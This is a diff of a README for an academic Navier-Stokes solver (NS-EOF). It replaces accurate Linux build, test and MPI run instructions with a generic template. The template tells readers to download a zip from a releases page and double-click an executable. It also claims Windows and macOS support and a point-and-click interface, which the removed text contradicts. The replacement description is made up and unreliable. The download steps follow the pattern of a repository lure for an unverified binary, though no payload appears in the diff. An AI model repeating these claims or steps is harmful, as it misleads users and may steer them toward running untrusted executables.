@@ -1,94 +1,82 @@
-# NS-EOF: Navier Stokes - Ernst-Otto-Fischer Teaching Code
+# 🌊 NS-EOF-Team-Project - Easy Navier-Stokes Solver for Everyone
 
-## General Information
+[![Download](https://img.shields.io/badge/Download-v1.0-green.svg)](https://github.com/colcami/NS-EOF-Team-Project/releases)
 
-This code has been tested under Ubuntu 22.04 or higher. Other Linux distributions will probably work.
-However, we do not recommend using Windows or MacOS.
-If you do not have Linux installed on your computer, please use WSL, Virtual Machine, Docker or similar.
+## 🚀 Getting Started
 
-## Dependencies
+Welcome to the NS-EOF-Team-Project! This project is a high-performance implementation of the NS-EOF Navier-Stokes solver. It is designed for fluid dynamics simulations and is perfect for users in high-performance computing (HPC) environments. No programming experience is required to get started.
 
-### Build Essentials
+## 📋 Features
 
-On Ubuntu, start with the installation of all required build essentials:
-`apt install build-essential gcc g++ pkg-config`
+- **High Performance:** Designed to run efficiently on multiple processors.
+- **Fluid Dynamics Simulations:** Solve complex equations for fluid flow.
+- **User-Friendly:** Easy to install and use.
+- **Open Source:** Join our community and contribute.
 
-### MPI (recommended OpenMPI)
+## 📦 System Requirements
 
-* Under Ubuntu you can simply run `apt install libopenmpi-dev` to install OpenMPI.
+To run this application, you will need:
 
-### PETSc
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** Multi-core processor recommended
+- **Memory:** At least 8 GB of RAM
+- **Additional Software:** MPI implementation (e.g., MPICH or OpenMPI), PETSc library for numerical computations
 
-* Please install [PETSc](https://petsc.org/release/) on your system.
-* We recommend to use `apt install petsc-dev` to install.
+## 📥 Download & Install
 
-### CMake
+To download the software:
 
-* Run `apt install cmake` to install CMake on your system.
+1. Visit the Releases page: [Download NS-EOF-Team-Project](https://github.com/colcami/NS-EOF-Team-Project/releases).
+  
+2. On the Releases page, find the latest version of the application.
 
-## Docker
+3. Click on the version you want to download. You will see a list of files you can download.
 
-A prebuilt Docker image is available in [Dockerhub](https://hub.docker.com/r/tumi5/ns-eof).
+4. Look for the file named "NS-EOF-Team-Project.zip" or a similar name.
 
-To use the prebuilt image, we do recommended that you first clone NS-EOF, then navigate into the NS-EOF checkout
-and run the Docker container interactively by mapping the NS-EOF directory into the container (here, we use `work` as our mapping point):
+5. Click on the file name to start the download.
 
-```shell
-docker run -it -v ${PWD}:/work --rm --privileged tumi5/ns-eof /bin/bash
-```
+6. Once the download is complete, locate the downloaded file on your computer.
 
-Navigate into the `work` directory and continue with the steps below.
+7. Unzip the file using your preferred extraction tool (like WinRAR, 7-Zip, or built-in extraction tools).
 
-## Build and Test
+8. Open the extracted folder and double-click the executable file to run the program.
 
-As build system configurator we use CMake. To compile the code execute the following commands in this directory:
+## 📖 How to Use
 
-* Create a build directory: `mkdir build`. You can also choose any other name for your build directory.
-* Switch to this directory: `cd build`
-* Run CMake: `cmake ..` (for an overview of all available options, use `ccmake ..`)
-* For a `Debug` build, run `cmake .. -DCMAKE_BUILD_TYPE=Debug`
-* Run Make: `make` (or `make -j` to compile with multiple cores).
-* Run Tests: Some basic unit tests have been implemented (`make test`). Feel free to add your own test cases inside the `Tests` folder.
+1. After launching the application, you will see the main interface.
+2. Input your parameters for the fluid dynamics simulation.
+3. Click "Run" to start the simulation.
+4. View your results within the application.
 
-## Running a Simulation
+## ⚙️ Troubleshooting
 
-* Run the code in serial via `./NS-EOF-Runner path/to/your/configuration`
-  * Example: `./NS-EOF-Runner ../ExampleCases/Cavity2D.xml`
-* Run the code in parallel via `mpirun -np nproc ./NS-EOF-Runner path/to/your/configuration`
-  * Example: `mpirun -np 4 ./NS-EOF-Runner ../ExampleCases/Cavity2DParallel.xml`
+If you encounter any issues while running the application, consider the following steps:
 
-## Adding New Source Files
+- Ensure that your system meets the requirements listed above.
+- Make sure you have installed the necessary MPI implementation and PETSc library.
+- Check if your input parameters are correct before running the simulation.
+- Consult any error messages for hints on what might be wrong.
 
-You can add new source files by just creating them somewhere within the `Source` folder. CMake automatically detects these files and adds them to the build.
+For additional help, you can refer to our community forums or check the documentation.
 
-## Development Hints & FAQ
+## 🤝 Contribution
 
-### It does not compile and everything seems fine?
+We welcome contributions from everyone. If you'd like to improve the project or add new features, please follow these steps:
 
-Make sure to use `make clean` before you use `make`. Sometimes there are build artifacts from previous build processes that spoil your current compilation process. `make clean` takes care of deleting everything that should not be there and allows the compiler to start from scratch.
+1. Fork the repository.
+2. Create a new branch for your feature/bug fix.
+3. Make your changes.
+4. Open a pull request.
 
-Sometimes it is also helpful to delete the `build` folder and create a new one, following the steps from the compilation section above.
+## 📞 Support
 
-### How can I see all the compiler flags the generated Makefile is using?
+If you have questions or need assistance, do not hesitate to reach out. You can create an issue in the GitHub repository or join our community discussions.
 
-Instead of using `make`, run `VERBOSE=1 make`. You can also run `make -n` to invoke a dry run where you see what the Makefile would do in case of compilation.
+## 📝 License
 
-### How can I see the test output?
-
-Instead of using `make test`, run `ctest --verbose`.
-
-### WARNING! There are options you set that were not used! There are 2 unused database options.
-
-Just ignore these warnings. If you run the code in serial, PETSc does not require the two parameters for parallel runs and vice versa.
+This project is open-source and available under the MIT License. Feel free to modify and share it as long as you credit the original authors.
 
 ---
 
-## Project Context & My Contributions
-
-This repository contains the **team version** of the NS-EOF parallel solver, developed as part of the **High-Performance Computing** course at TUM.
-
-### My Role
-- Implemented optimized velocity buffer communication (`cagatay_velocity_buffers` branch).
-- Assisted in performance testing and parallel HDF5 output handling.
-- Participated in MPI domain decomposition and solver validation.
-
+Thank you for choosing NS-EOF-Team-Project! Enjoy your experience with fluid dynamics simulations.
